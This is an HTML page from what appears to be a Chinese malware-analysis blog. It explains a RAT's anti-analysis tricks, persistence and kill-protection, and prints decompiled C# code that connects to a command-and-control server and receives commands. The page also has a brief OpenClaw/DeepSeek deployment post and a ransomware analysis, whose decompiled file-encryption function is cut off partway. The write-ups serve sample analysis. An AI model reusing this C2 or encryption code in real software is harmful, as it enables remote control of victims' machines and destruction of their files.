+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513215348024.png" alt="image-20260513215348024"></p>
+<p>可以看见这里使用了aes256的cbc模式和HMAC-SHA256来检验</p>
+<h2 id="木马运行"><a href="#木马运行" class="headerlink" title="木马运行"></a>木马运行</h2><p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513215719995.png" alt="image-20260513215719995"></p>
+<p>这个是运行逻辑分别是先检查一个木马运行，反调试检测，持久化设计，禁止终止进程</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513215928275.png" alt="image-20260513215928275"></p>
+<p>这里看到用互斥体来保持一个运行程序</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513220043682.png" alt="image-20260513220043682"></p>
+<p>这个用来反调试分别是反虚拟机，反调试，，判断内存大小来反沙箱，反xp系统</p>
+<p>接下来看持久化设计</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513222041250.png" alt="image-20260513222041250"></p>
+<p>先是获取目标文件如果有久的程序久停止然后如果是管理员权限就打开cmd然后用任务计划来自启动</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513223608665.png" alt="image-20260513223608665"></p>
+<p>没有权限就加入开机自启目录</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513223707372.png" alt="image-20260513223707372"></p>
+<p>然后创造新的文件将旧的复制进去，再写一个bat文本并运行，它重启新文件再删除自己，最后隐藏木马</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513224853737.png" alt="image-20260513224853737"></p>
+<p>他是用来关闭连接和删除程序的（当环境不对时）</p>
+<p>这个是禁止终止进程</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513224421561.png" alt="image-20260513224421561"></p>
+<p>主要先提升权限设置当前程序的重要程度当强制终止时就蓝屏</p>
+<h2 id="c2连接"><a href="#c2连接" class="headerlink" title="c2连接"></a>c2连接</h2><p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513225213926.png" alt="image-20260513225213926"></p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513225337914.png" alt="image-20260513225337914"></p>
+<p>第一个时用来关闭各种协议的，第二是连上服务器的关键但是内容比较多我用代码和注释来解释</p>
+<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mckAnMrPneuzxANr</span>()</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">try</span></span><br><span class="line">			&#123;</span><br><span class="line">				liiyJozWhQGcm.qTXVqOEKvPlptUhe = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)</span><br><span class="line">				&#123;</span><br><span class="line">					ReceiveBufferSize = <span class="number">51200</span>,</span><br><span class="line">					SendBufferSize = <span class="number">51200</span></span><br><span class="line">				&#125;;<span class="comment">//tcp建立</span></span><br><span class="line">				<span class="keyword">if</span> (rShUJoWxIfULR.mJRpWzfYptlR == <span class="string">&quot;null&quot;</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="built_in">string</span> text = rShUJoWxIfULR.IwnXSYzJgOVYTMj.Split(<span class="keyword">new</span> <span class="built_in">char</span>[] &#123; <span class="string">&#x27;,&#x27;</span> &#125;)[<span class="keyword">new</span> Random().Next(rShUJoWxIfULR.IwnXSYzJgOVYTMj.Split(<span class="keyword">new</span> <span class="built_in">char</span>[] &#123; <span class="string">&#x27;,&#x27;</span> &#125;).Length)];</span><br><span class="line">					<span class="built_in">int</span> num = Convert.ToInt32(rShUJoWxIfULR.eGvvAeHcGvsmgsOkug.Split(<span class="keyword">new</span> <span class="built_in">char</span>[] &#123; <span class="string">&#x27;,&#x27;</span> &#125;)[<span class="keyword">new</span> Random().Next(rShUJoWxIfULR.eGvvAeHcGvsmgsOkug.Split(<span class="keyword">new</span> <span class="built_in">char</span>[] &#123; <span class="string">&#x27;,&#x27;</span> &#125;).Length)]);<span class="comment">//ip地址，端口拆分</span></span><br><span class="line">					<span class="keyword">if</span> (liiyJozWhQGcm.lGcTzSsFKfoycD(text))</span><br><span class="line">					&#123;</span><br><span class="line">						<span class="keyword">foreach</span> (IPAddress ipaddress <span class="keyword">in</span> Dns.GetHostAddresses(text))</span><br><span class="line">						&#123;</span><br><span class="line">							<span class="keyword">try</span></span><br><span class="line">							&#123;</span><br><span class="line">								liiyJozWhQGcm.qTXVqOEKvPlptUhe.Connect(ipaddress, num);</span><br><span class="line">								<span class="keyword">if</span> (liiyJozWhQGcm.qTXVqOEKvPlptUhe.Connected)</span><br><span class="line">								&#123;</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">catch</span></span><br><span class="line">							&#123;</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">else</span></span><br><span class="line">					&#123;</span><br><span class="line">						liiyJozWhQGcm.qTXVqOEKvPlptUhe.Connect(text, num);</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;<span class="comment">//尝试用ip直连</span></span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">using</span> (WebClient webClient = <span class="keyword">new</span> WebClient())</span><br><span class="line">					&#123;</span><br><span class="line">						NetworkCredential networkCredential = <span class="keyword">new</span> NetworkCredential(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">						webClient.Credentials = networkCredential;</span><br><span class="line">						<span class="built_in">string</span>[] array = webClient.DownloadString(rShUJoWxIfULR.mJRpWzfYptlR).Split(<span class="keyword">new</span> <span class="built_in">string</span>[] &#123; <span class="string">&quot;:&quot;</span> &#125;, StringSplitOptions.None);</span><br><span class="line">						rShUJoWxIfULR.IwnXSYzJgOVYTMj = array[<span class="number">0</span>];</span><br><span class="line">						rShUJoWxIfULR.eGvvAeHcGvsmgsOkug = array[<span class="keyword">new</span> Random().Next(<span class="number">1</span>, array.Length)];</span><br><span class="line">						liiyJozWhQGcm.qTXVqOEKvPlptUhe.Connect(rShUJoWxIfULR.IwnXSYzJgOVYTMj, Convert.ToInt32(rShUJoWxIfULR.eGvvAeHcGvsmgsOkug));</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;<span class="comment">//用名字链接来获取ip再联系服务器</span></span><br><span class="line">				<span class="keyword">if</span> (liiyJozWhQGcm.qTXVqOEKvPlptUhe.Connected)</span><br><span class="line">				&#123;</span><br><span class="line">					liiyJozWhQGcm.sMTGUDsWLFW = <span class="literal">true</span>;</span><br><span class="line">					liiyJozWhQGcm.AYswsEOoIgyT = <span class="keyword">new</span> SslStream(<span class="keyword">new</span> NetworkStream(liiyJozWhQGcm.qTXVqOEKvPlptUhe, <span class="literal">true</span>), <span class="literal">false</span>, <span class="keyword">new</span> RemoteCertificateValidationCallback(liiyJozWhQGcm.JZXSVHgewuqAOe));	<span class="comment">//跳过ssl检验</span></span><br><span class="line">                    liiyJozWhQGcm.AYswsEOoIgyT.AuthenticateAsClient(liiyJozWhQGcm.qTXVqOEKvPlptUhe.RemoteEndPoint.ToString().Split(<span class="keyword">new</span> <span class="built_in">char</span>[] &#123; <span class="string">&#x27;:&#x27;</span> &#125;)[<span class="number">0</span>], <span class="literal">null</span>, SslProtocols.Tls, <span class="literal">false</span>);<span class="comment">//tls加密</span></span><br><span class="line">					liiyJozWhQGcm.sEZsahAWzA = <span class="number">4L</span>;</span><br><span class="line">					liiyJozWhQGcm.usTxSbjkwLraBeu = <span class="keyword">new</span> <span class="built_in">byte</span>[liiyJozWhQGcm.sEZsahAWzA];</span><br><span class="line">					liiyJozWhQGcm.DMBgjrvDuLmnnF = <span class="number">0L</span>;</span><br><span class="line">					liiyJozWhQGcm.ALsFOGfDQIYEq(xzQgkqwNpJ.LXExWtOiUUtLe());<span class="comment">//发送本机消息</span></span><br><span class="line">					liiyJozWhQGcm.ECWSXtkklGcnZ = <span class="number">0</span>;</span><br><span class="line">					liiyJozWhQGcm.fNRolwEdaLMWcm = <span class="literal">false</span>;</span><br><span class="line">					liiyJozWhQGcm.OcgqzeSEjnEmft = <span class="keyword">new</span> Timer(<span class="keyword">new</span> TimerCallback(liiyJozWhQGcm.NkXKBOZThWVSL), <span class="literal">null</span>, <span class="keyword">new</span> Random().Next(<span class="number">10000</span>, <span class="number">15000</span>), <span class="keyword">new</span> Random().Next(<span class="number">10000</span>, <span class="number">15000</span>));<span class="comment">//心跳包</span></span><br><span class="line">					liiyJozWhQGcm.jPdfsrWDTFIim = <span class="keyword">new</span> Timer(<span class="keyword">new</span> TimerCallback(liiyJozWhQGcm.sbzatzMGJdJdc), <span class="literal">null</span>, <span class="number">1</span>, <span class="number">1</span>);<span class="comment">//持续接受命令</span></span><br><span class="line">					liiyJozWhQGcm.AYswsEOoIgyT.BeginRead(liiyJozWhQGcm.usTxSbjkwLraBeu, (<span class="built_in">int</span>)liiyJozWhQGcm.DMBgjrvDuLmnnF, (<span class="built_in">int</span>)liiyJozWhQGcm.sEZsahAWzA, <span class="keyword">new</span> AsyncCallback(liiyJozWhQGcm.GOShPGzCCNbAE), <span class="literal">null</span>);<span class="comment">//接受命令</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					liiyJozWhQGcm.sMTGUDsWLFW = <span class="literal">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span></span><br><span class="line">			&#123;</span><br><span class="line">				liiyJozWhQGcm.sMTGUDsWLFW = <span class="literal">false</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>结语：这个木马就分析完但是解密和流量分析都还没做有空做一下</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%9C%A8%E9%A9%AC/" rel="tag"><i class="fa fa-tag"></i> 木马</a>
+          </div>
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block cat-其他">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://woshinext.top/2026/05/13/openclaw-deepseek-v4-doubao-1-8%E9%83%A8%E7%BD%B2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Next">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Next的小站">
+      <meta itemprop="description" content="记录样本分析、脱壳去混淆、反调试对抗等底层安全技术笔记。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Next的小站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/05/13/openclaw-deepseek-v4-doubao-1-8%E9%83%A8%E7%BD%B2/" class="post-title-link" itemprop="url">openclaw+deepseek v4+doubao 1.8部署</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-05-13 16:12:26" itemprop="dateCreated datePublished" datetime="2026-05-13T16:12:26+08:00">2026-05-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E5%85%B6%E4%BB%96/" itemprop="url" rel="index"><span itemprop="name">其他</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>347</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>1 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p>最近研究了下ai agent本地部署的事，想要用国外的大模型还是比较麻烦</p>
+<p>第一是用中转站open ai不稳定而且容易倒闭，</p>
+<p>第二用集成的ai平台虽然比较稳定但是每个月要冲不少钱还不能本地化部署也很麻烦而且没有信誉较好的凭证容易删号跑路，</p>
+<p>第三就是注册港澳电话卡获得国外的账户然后直接使用但每次的电话费用和要翻外网使用成本比较高和程序繁琐（有一个谷歌账号就好了）</p>
+<p>第四使用本地开源模型一方面是我的笔记本负担不了那么多内存和开源模型大多没有那么先进</p>
+<p>所以我想要可以agent代理模型调用方便，负担小就使用了openclaw和deepseek v4，再加上要一些图片读取使用豆包的1.8模型</p>
+<p>接下来是安装步骤</p>
+<p>1.用命令行安装openclaw（问ai）</p>
+<p>2.去deepseek和火山引擎获得open api接口（记得看官方文档里面的curl和模型名）</p>
+<p>3.用openclaw的命令安装deepseek和doubao（openclaw configure）local-model-custom provide-api配置</p>
+<p>4.打开（openclaw gateway）用deepseek模型写python脚本调用豆包读取图片</p>
+<p>下面是我布置成功的界面</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260513170903013.png" alt="image-20260513170903013"></p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/AI/" rel="tag"><i class="fa fa-tag"></i> AI</a>
+              <a href="/tags/OpenClaw/" rel="tag"><i class="fa fa-tag"></i> OpenClaw</a>
+              <a href="/tags/%E9%83%A8%E7%BD%B2/" rel="tag"><i class="fa fa-tag"></i> 部署</a>
+          </div>
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block cat-样本分析">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="https://woshinext.top/2026/04/25/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Next">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Next的小站">
+      <meta itemprop="description" content="记录样本分析、脱壳去混淆、反调试对抗等底层安全技术笔记。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content=" | Next的小站">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2026/04/25/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92/" class="post-title-link" itemprop="url">勒索病毒</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2026-04-25 17:03:07" itemprop="dateCreated datePublished" datetime="2026-04-25T17:03:07+08:00">2026-04-25</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>925</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>3 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260425170630680.png" alt="image-20260425170630680"></p>
+<p>这是一个勒索病毒</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260425170802329.png" alt="image-20260425170802329"></p>
+<p>主函数开头是一个获得私钥的处理</p>
+<p>load_public_key();是主要逻辑函数</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260425171015999.png" alt="image-20260425171015999"></p>
+<p>这里是一个读取磁盘每个文件并加密的过程其中加密逻辑主要在process_directory(v28, v23, v16);中</p>
+<p>末尾change_wallpaper_for_all_users();set_lock_screen_for_all_users();分别是替换壁纸和锁定壁纸</p>
+<p>现在来看一下process_directory(v28, v23, v16);</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260427214521705.png" alt="image-20260427214521705"></p>
+<p>函数前面是为了开启线程，让循环加密的时候可以同时是机密多个文件</p>
+<p>std::function&lt;void ()(std::string const&amp;)&gt;::operator()(v5, a1);这个是加密的主要逻辑</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260425173322605.png" alt="image-20260425173322605"></p>
+<p>打开看可以看见有调用了v2函数但是函数调用的地址是偏移调用的所以必须动调来看</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260427214557897.png" alt="image-20260427214557897"></p>
+<p>接着可以看见又调用了__invoke_r</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260425173544172.png" alt="image-20260425173544172"></p>
+<p>又调用了__invoke_impl</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260425173745629.png" alt="image-20260425173745629"></p>
+<p>打开process_directory可以看见主要逻辑</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260425173837447.png" alt="image-20260425173837447"></p>
+<p>这里可以清楚的看见加密的主要用了lambda(std::string const&amp;)#1}::operator() const(std::string const&amp;)::{lambda(void)#1</p>
+<p>我们直接搜索函数lambda(std::string const&amp;)#1}::operator()</p>
+<p><img data-src="https://cdn.jsdelivr.net/gh/availblemy/blog-img@main/img/image-20260427214320773.png" alt="image-20260427214320773"></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">encrypt_file</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> CHAR *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  LARGE_INTEGER v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  DWORD v7; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">void</span> *v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v10; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v11; <span class="comment">// rdi</span></span><br><span class="line">  __int64 v12; <span class="comment">// r12</span></span><br><span class="line">  __int64 v13; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v14; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v15; <span class="comment">// rax</span></span><br><span class="line">  DWORD v16; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v17; <span class="comment">// rax</span></span><br><span class="line">  __int64 v18; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v19; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">const</span> CHAR *v20; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">const</span> CHAR *v21; <span class="comment">// rax</span></span><br><span class="line">  DWORD NumberOfBytesWritten; <span class="comment">// [rsp+4Ch] [rbp-34h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v24[<span class="number">28</span>]; <span class="comment">// [rsp+50h] [rbp-30h] BYREF</span></span><br><span class="line">  DWORD NumberOfBytesRead; <span class="comment">// [rsp+6Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v26[<span class="number">32</span>]; <span class="comment">// [rsp+70h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">int</span> Buffer[<span class="number">2</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+98h] [rbp+18h] BYREF</span></span><br><span class="line">  DWORD v29; <span class="comment">// [rsp+19Ch] [rbp+11Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v30[<span class="number">32</span>]; <span class="comment">// [rsp+1A0h] [rbp+120h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v31[<span class="number">32</span>]; <span class="comment">// [rsp+1C0h] [rbp+140h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v32[<span class="number">32</span>]; <span class="comment">// [rsp+1E0h] [rbp+160h] BYREF</span></span><br><span class="line">  LARGE_INTEGER FileSize; <span class="comment">// [rsp+200h] [rbp+180h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v34; <span class="comment">// [rsp+20Eh] [rbp+18Eh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v35; <span class="comment">// [rsp+20Fh] [rbp+18Fh] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v36; <span class="comment">// [rsp+210h] [rbp+190h] BYREF</span></span><br><span class="line">  __int64 v37; <span class="comment">// [rsp+218h] [rbp+198h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v38; <span class="comment">// [rsp+227h] [rbp+1A7h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v39; <span class="comment">// [rsp+228h] [rbp+1A8h]</span></span><br><span class="line">  <span class="type">char</span> *v40; <span class="comment">// [rsp+230h] [rbp+1B0h]</span></span><br><span class="line">  <span class="type">char</span> *v41; <span class="comment">// [rsp+238h] [rbp+1B8h]</span></span><br><span class="line">  DWORD nNumberOfBytesToRead[<span class="number">2</span>]; <span class="comment">// [rsp+240h] [rbp+1C0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 QuadPart; <span class="comment">// [rsp+248h] [rbp+1C8h]</span></span><br><span class="line">  LARGE_INTEGER v44; <span class="comment">// [rsp+250h] [rbp+1D0h]</span></span><br><span class="line">  HANDLE hFile; <span class="comment">// [rsp+258h] [rbp+1D8h]</span></span><br><span class="line">  __int64 v46; <span class="comment">// [rsp+260h] [rbp+1E0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v47; <span class="comment">// [rsp+268h] [rbp+1E8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = (<span class="type">const</span> CHAR *)std::string::<span class="built_in">c_str</span>(a1);</span><br><span class="line">  hFile = <span class="built_in">CreateFileA</span>(v3, <span class="number">0xC0000000</span>, <span class="number">1u</span>, <span class="number">0</span>i64, <span class="number">3u</span>, <span class="number">0x80u</span>, <span class="number">0</span>i64);</span><br><span class="line">  <span class="keyword">if</span> ( hFile == (HANDLE)<span class="number">-1</span>i64 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">GetFileSizeEx</span>(hFile, &amp;FileSize)</span><br><span class="line">         &amp;&amp; ((v44 = FileSize, FileSize.QuadPart &gt; <span class="number">0x500000000u</span>i64)</span><br><span class="line">           ? (v<span class="number">5.</span>QuadPart = <span class="number">0x280000000</span>i64)</span><br><span class="line">           : (LONGLONG)(v5 = v44),</span><br><span class="line">             (QuadPart = v<span class="number">5.</span>QuadPart) != <span class="number">0</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v41 = &amp;v34;</span><br><span class="line">    std::vector&lt;<span class="type">unsigned</span> <span class="type">char</span>&gt;::<span class="built_in">vector</span>(v32, <span class="number">12</span>i64, &amp;v34);</span><br><span class="line">    std::__new_allocator&lt;<span 